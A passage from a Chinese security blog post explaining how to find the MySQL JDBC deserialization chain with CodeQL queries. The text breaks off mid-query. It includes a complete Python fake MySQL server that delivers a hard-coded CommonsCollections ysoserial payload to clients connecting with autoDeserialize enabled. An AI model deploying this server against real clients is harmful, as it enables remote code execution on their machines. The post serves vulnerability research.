    <id>http://example.com/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-10-07T09:18:15.000Z</published>
    <updated>2023-10-13T10:25:07.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网上大部分都是直接分析JDBC的过程，我这里就不赘述了，这里说一下用codeql分析的思路<br><span id="more"></span></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>加载完pom以后调试的时候会显示download source，这时候就可以把源码下下来了，然后去repository里面找到源码</p><p><a href="https://github.com/waderwu/extractor-java">https://github.com/waderwu/extractor-java</a></p><p>用该项目去生成database</p><p>java代码</p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_Url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3307/test?&quot;</span>+</span><br><span class="line">                <span class="string">&quot;autoDeserialize=true&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(JDBC_Url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>python的恶意服务器，记得自己用ysoserial生成payload<br><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>    </div></div></p><h1 id="选用方法"><a href="#选用方法" class="headerlink" title="选用方法"></a>选用方法</h1><p>首先是选用污点追踪，还是用<code>polyCalls</code>的方法，这里不用多说，肯定是用<code>polyCalls</code>这种函数调用的方法去找出链子，因为这里并不是说像分析springweb那样，追踪传入的get/post参数看他有没有sql注入之类的。</p><h1 id="找Sink"><a href="#找Sink" class="headerlink" title="找Sink"></a>找Sink</h1><p>sink就是<code>readObject</code>，找到哪些函数调用了<code>readObject</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects1 extends <span class="keyword">Call</span> &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.getCallee().hasName(&quot;readObject&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><blockquote><p>因为这里的<code>readObject</code>是被调用的，也没有任何的定义，所以继承<code>Call</code>，<code>getCallee</code>是函数本身。<br>如果是<code>this.getCaller().hasName(&quot;readObject&quot;)</code>那么就是readObject中调用了什么函数，结果如下<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p></blockquote><p>在这里可以找到3个readObject，但是调用他们的函数只有两个，分别是</p><ul><li>com.mysql.cj.jdbc.result.ResultSetImpl-&gt;getObject（一个参数）</li><li>com.mysql.cj.jdbc.util.ResultSetUtil-&gt;readObject(两个参数)</li></ul><p>那么codeql可以写出两个sink<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意这里是Callable，因为是找函数的定义，而不是调用</p><h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p>一般来说Source就是比较难找的，sink无非就是那些危险函数。source就千变万化了。<br>在这里应该就是<code>getConnection</code>，但是<code>getConnection</code>在package<code>java.sql</code>中，并不在我们分析的库中，所以这里用</p><ul><li>com.mysql.cj.jdbc.NonRegisteringDriver-&gt;connect</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GetConnection</span> <span class="keyword">extends</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasName(<span class="string">&quot;connect&quot;</span>) and</span><br><span class="line">        <span class="built_in">this</span>.getDeclaringType().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc&quot;</span>,<span class="string">&quot;NonRegisteringDriver&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>按source分为两块讲</p><h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ReadObjects sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>第一个没有东西链子</p><h2 id="getObject"><a href="#getObject" class="headerlink" title="getObject"></a>getObject</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;connect&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;NonRegisteringDriver&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span 